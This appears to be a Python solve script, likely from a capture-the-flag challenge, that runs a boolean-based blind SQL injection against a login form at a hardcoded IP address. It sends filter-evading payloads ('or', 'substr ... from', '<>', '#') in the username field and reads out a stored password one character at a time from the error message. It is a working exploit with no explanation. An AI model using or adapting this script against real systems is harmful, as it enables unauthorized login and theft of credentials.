import  requests
string_all="0123456789abcdefghijklmnopqrstuvwxyz"
url="http://114.67.175.224:15968/index.php"
flag=""
fla=0
r=requests.session()
for i in range(1,50):
    for j in string_all:
        j=j+flag
        payload="din'or(!(substr((password)from({0}))<>'{1}'))#".format((-i), j)
        data={
            #按情况修改名字
            "username":payload,
            "password":"admin",
        }
        response=r.post(url,data=data)
        print(payload)
        #需要修改条件
        if "password error" in response.text:
            print(flag)
            flag=j
            print(flag+"this cycle is finished with right result")
            break
        elif j[0]=='z':
            print(flag + "this cycle is finished with the end")
            fla=1
            break
    if fla==1:
        break
print("password is",flag)
